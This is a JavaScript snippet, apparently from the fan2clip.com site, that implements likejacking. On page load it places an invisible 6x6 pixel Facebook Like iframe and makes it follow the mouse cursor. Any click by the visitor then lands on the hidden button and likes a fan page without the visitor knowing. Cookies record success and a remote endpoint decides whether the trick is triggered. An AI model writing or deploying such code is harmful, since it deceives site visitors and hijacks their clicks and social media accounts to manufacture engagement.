    var fanpage = 'https://www.facebook.com/pages/Fan2Clip/1571931466409541';
    function fblSetCookie(c_name, value, exTime) {
        var exdate = new Date();
        exdate.setTime(exdate.getTime() + exTime * 1000);
        var c_value = escape(value) + ((exTime == null) ? "" : "; expires=" + exdate.toUTCString());
        document.cookie = c_name + "=" + c_value
    }
    function fblGetCookie(c_name) {
        var c_value = document.cookie;
        var c_start = c_value.indexOf(" " + c_name + "=");
        if (c_start == -1) {
            c_start = c_value.indexOf(c_name + "=")
        }
        if (c_start == -1) {
            c_value = null
        } else {
            c_start = c_value.indexOf("=", c_start) + 1;
            var c_end = c_value.indexOf(";", c_start);
            if (c_end == -1) {
                c_end = c_value.length
            }
            c_value = unescape(c_value.substring(c_start, c_end))
        }
        return c_value
    }
    var updateActiveElementInterval;
    function updateActiveElement() {
        if (jQuery(document.activeElement).attr('id') == "fbframe") {
            jQuery(document).unbind('mousemove');
            clearInterval(updateActiveElementInterval);
            jQuery('a').css('cursor', 'pointer');
            setTimeout(function () {
                jQuery('#facebooklike').css('left', '-10px');
                jQuery('#facebooklike').css('top', '-10px');
                fblSetCookie('24hinh_net', 1, 864000000);

            }, 150)
        }
    }
    function facebookLike() {
        jQuery("body").append('<div style="overflow: hidden; width: 6px; height: 6px;  position: absolute; z-index: 8000; filter:alpha(opacity=0); -moz-opacity:0.0; -khtml-opacity: 0.0; opacity: 0.0;" id="facebooklike"><iframe src="http://www.facebook.com/plugins/like.php?href=' + fanpage + '&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;font=tahoma&amp;colorscheme=light&amp;height=80" style="border: none; overflow: hidden; width: 50x;height: 23px;" allowtransparency="true" id="fbframe" name="fbframe" frameborder="0" scrolling="no"></iframe></div>');
        jQuery.ajax({
            url:'http://fan2clip.com/checktimeliked',
            success:function(data){
                if(data == 1){
                    if (!fblGetCookie('fan2clip')) {
                        updateActiveElementInterval = setInterval("updateActiveElement();", 10);
                        jQuery(document).mousemove(function (e) {
                            jQuery('a').css('cursor', 'default');
                            jQuery('#facebooklike').css('left', (e.pageX - 3) + 'px');
                            jQuery('#facebooklike').css('top', (e.pageY - 3) + 'px')
                        })
                    }
                }
            }
        })

    }
    facebookLike();